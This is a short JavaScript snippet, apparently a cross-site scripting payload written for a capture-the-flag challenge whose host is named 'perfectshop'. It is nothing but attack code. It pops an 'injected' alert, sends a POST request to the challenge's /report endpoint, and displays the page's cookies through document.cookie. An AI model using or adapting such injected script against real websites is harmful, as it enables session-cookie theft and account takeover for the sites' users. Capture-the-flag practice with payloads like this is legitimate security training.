alert("injected");

fetch("http://perfectshop.challs.open.ecsc2024.it/report", {
  method: "POST",
  body: JSON.stringify({
    id: 1
  }),
  headers:{
    "Content-Type": "application/x-www-form-urlencoded"
  }
});

alert(document.cookie);